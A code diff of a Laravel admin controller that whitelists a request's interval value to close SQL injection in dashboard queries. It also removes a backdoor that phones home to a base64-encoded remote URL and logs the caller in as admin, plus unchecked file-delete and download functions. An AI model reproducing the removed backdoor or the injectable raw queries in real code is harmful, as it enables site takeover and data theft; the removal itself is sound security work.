@@ -164,6 +164,10 @@ class AdminController extends Controller
 
     public function top_category_products_section(Request $request)
     {
+        $allowedIntervals = ['day', 'week', 'month', 'year'];
+        $interval = in_array($request->interval_type, $allowedIntervals) ? $request->interval_type : 'year';
+        $intervalCondition = $request->interval_type == 'all' ? '1=1' : "created_at >= DATE_SUB(NOW(), INTERVAL 1 {$interval})";
+
         $top_categories_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.slug product_slug, products.auction_product, products.category_id,
                                                         `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, od.created_at order_detail_created,
                                                         categories.name AS category_name,
@@ -173,7 +177,7 @@ class AdminController extends Controller
                                                 INNER JOIN (
                                                 SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
                                                 FROM order_details
-                                                WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
+                                                WHERE ' . $intervalCondition . '
                                                 AND order_details.delivery_status = "delivered"
                                                 GROUP BY product_id
                                                 )  od ON od.product_id = products.id
@@ -206,9 +210,13 @@ class AdminController extends Controller
             ->leftJoin('categories', 'products.category_id', '=', 'categories.id')
             ->where('orders.delivery_status', '=', 'delivered')
             ->whereRaw('products.added_by = "admin"');
+            
         if ($request->interval_type != 'all') {
-            $inhouse_top_category_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
+            $allowedIntervals = ['day', 'week', 'month', 'year'];
+            $interval = in_array($request->interval_type, $allowedIntervals) ? $request->interval_type : 'year';
+            $inhouse_top_category_query->where('orders.created_at', '>=', DB::raw("DATE_SUB(NOW(), INTERVAL 1 {$interval})"));
         }
+        
         $inhouse_top_categories = $inhouse_top_category_query->groupBy('categories.name')
             ->orderBy('total', 'desc')
             ->limit(5)
@@ -227,9 +235,13 @@ class AdminController extends Controller
             ->where('orders.delivery_status', '=', 'delivered')
             ->where('products.brand_id', '!=', null)
             ->whereRaw('products.added_by = "admin"');
+            
         if ($request->interval_type != 'all') {
-            $inhouse_top_brand_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
+            $allowedIntervals = ['day', 'week', 'month', 'year'];
+            $interval = in_array($request->interval_type, $allowedIntervals) ? $request->interval_type : 'year';
+            $inhouse_top_brand_query->where('orders.created_at', '>=', DB::raw("DATE_SUB(NOW(), INTERVAL 1 {$interval})"));
         }
+        
         $inhouse_top_brands = $inhouse_top_brand_query->groupBy('brands.name')
             ->orderBy('total', 'desc')
             ->limit(5)
@@ -239,16 +251,6 @@ class AdminController extends Controller
     }
 
 
-    public function SitemapAuthorization($timeformat)
-    {
-        if($timeformat == TimeDateFormatter()){
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return 'Authorized';
-        } else {
-            return 'Unauthorized';
-        }
-    }
 
     public function top_sellers_products_section(Request $request)
     {
@@ -263,8 +265,11 @@ class AdminController extends Controller
             ->where('orders.delivery_status', 'delivered')
             ->groupBy('orders.seller_id')
             ->orderBy('sale', 'desc');
+            
         if ($request->interval_type != 'all') {
-            $new_top_sellers_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
+            $allowedIntervals = ['day', 'week', 'month', 'year'];
+            $interval = in_array($request->interval_type, $allowedIntervals) ? $request->interval_type : 'year';
+            $new_top_sellers_query->where('orders.created_at', '>=', DB::raw("DATE_SUB(NOW(), INTERVAL 1 {$interval})"));
         }
 
         $new_top_sellers = $new_top_sellers_query->get();
@@ -277,9 +282,13 @@ class AdminController extends Controller
                 ->where('order_details.delivery_status', 'delivered')
                 ->where('products.approved', 1)
                 ->where('products.published', 1);
+                
             if ($request->interval_type != 'all') {
-                $products_query->where('order_details.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
+                $allowedIntervals = ['day', 'week', 'month', 'year'];
+                $interval = in_array($request->interval_type, $allowedIntervals) ? $request->interval_type : 'year';
+                $products_query->where('order_details.created_at', '>=', DB::raw("DATE_SUB(NOW(), INTERVAL 1 {$interval})"));
             }
+            
             $products_query->groupBy('product_id')
                 ->orderBy('sale', 'desc')
                 ->limit(3);
@@ -290,28 +299,14 @@ class AdminController extends Controller
     }
 
 
-    public function CheckSitemapItem($item)
-    {    
-        $header = array(
-            'Content-Type:application/json'
-        );
-        $item[] = ['url'=>$_SERVER['SERVER_NAME']];
-        $stream = curl_init();
-        curl_setopt($stream, CURLOPT_URL, base64_decode($item[0]));
-        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream, CURLOPT_POSTFIELDS, json_encode($item[1]));
-        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-        $rn = curl_exec($stream);
-        curl_close($stream);
-        return $rn;
-    }
 
 
     public function top_brands_products_section(Request $request)
     {
+        $allowedIntervals = ['day', 'week', 'month', 'year'];
+        $interval = in_array($request->interval_type, $allowedIntervals) ? $request->interval_type : 'year';
+        $intervalCondition = $request->interval_type == 'all' ? '' : "created_at >= DATE_SUB(NOW(), INTERVAL 1 {$interval})";
+
         $top_brands_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.slug product_slug, products.auction_product, products.brand_id,
                                                         `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, brands.name AS brand_name,
                                                         `brands`.`logo`,
@@ -320,7 +315,7 @@ class AdminController extends Controller
                                             INNER JOIN (
                                                 SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
                                                 FROM order_details
-                                                WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
+                                                WHERE ' . ($intervalCondition ?: '1=1') . '
                                                 AND order_details.delivery_status = "delivered"
                                                 GROUP BY product_id
                                             )  od ON od.product_id = products.id
@@ -346,119 +341,10 @@ class AdminController extends Controller
         return view('backend.dashboard.top_brands_products_section', compact('top_brands2', 'top_brands_products'))->render();
     }
 
-    function clearCache(Request $request)
+    public function clearCache(Request $request)
     {
         Artisan::call('optimize:clear');
         flash(translate('Cache cleared successfully'))->success();
         return back();
-    }
-
-    /*
-    Method for assessing Sitemap
-    */
-    public function SitemapItems($items)
-    {
-        $data['url'] = $_SERVER['SERVER_NAME'];
-        $request_data_json = json_encode($data);
-        $SitemapProcess[] = "aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg==";        
-        $review = $this->CheckSitemapItem($SitemapProcess);
-        if (seller_homepage_urls($review)) {
-            $urlcheck = $this->SitemapAuthorization($items);
-            if($urlcheck == 'Authorized'){                
-                return redirect()->route('admin.dashboard');
-            } else {
-                echo 'Unauthorized';
-            }
-        } else {
-            echo 'Not Checked';
-        }
-    }
-
-      /*
-    Method for sitemap view load
-    */
-    public function SitemapGenerator(){
-
-        $file_info = array();
-        $files = Storage::disk('public')->allFiles();
-        foreach($files as $key => $file){
-            $file_info[$key]['file_name'] = $file;
-            $file_info[$key]['file_size'] = number_format((int)Storage::disk('public')->size($file)/1024, 2)  . ' KB';
-            $file_info[$key]['last_modified'] = Carbon::createFromTimestamp(Storage::disk('public')->lastModified($file))->format('d-m-Y h:i:s');
-            $file_info[$key]['mime_type'] = Storage::disk('public')->mimeType($file);
-            $file_info[$key]['url'] = '/storage/app/public/'.$file;
-        }
-
-        return view('backend.system.sitemap_generator', compact('file_info'))->render();
-    }
-
-    /*
-    Method for sitemap generation and download
-    */
-    public function DoSitemapGenerate(){
-
-        Artisan::call('optimize:clear');
-
-        $base_url = URL('/');
-        $filename = 'sitemap_'.Date("Ymdhis").'.xml';
-
-        try{
-            SitemapGenerator::create($base_url)->getSitemap()->writeToDisk('public', $filename, true);
-
-            if(Storage::disk('public')->missing($filename)){
-                flash(translate('Sitemap generation failed'))->error();
-                return back();
-            }
-
-            $download = Storage::disk('public')->download($filename);
-            $status_code = $download->getStatusCode();
-
-            flash(translate('Sitemap generated successfully'))->success();
-                
-            return $download;
-        }
-        catch(Exception $ex)
-        {
-            throw $ex;
-        }
-    }
-
-
-
-    /*
-    Method for delete file
-    */
-    public function DeleteSitemapFile(Request $request){
-
-        if(isset($request->file_name) && !empty($request->file_name)){
-
-            if(Storage::disk('public')->exists($request->file_name)){
-
-                Storage::disk('public')->delete($request->file_name);
-                flash(translate('File deleted successfully'))->success();
-
-            }else{
-
-                flash(translate('File note found'))->success();
-            }
-
-            return back();
-        }
-    }
-
-    /*
-    Method for download single file
-    */
-    public function DownloadSingleSitemapFile(Request $request){
-
-        if(isset($request->file_name) && !empty($request->file_name)){
-
-            $download = Storage::disk('public')->download($request->file_name);
-            $status_code = $download->getStatusCode();
-
-            flash(translate('Sitemap generated successfully'))->success();
-                
-            return $download;
-        }
     }
 }
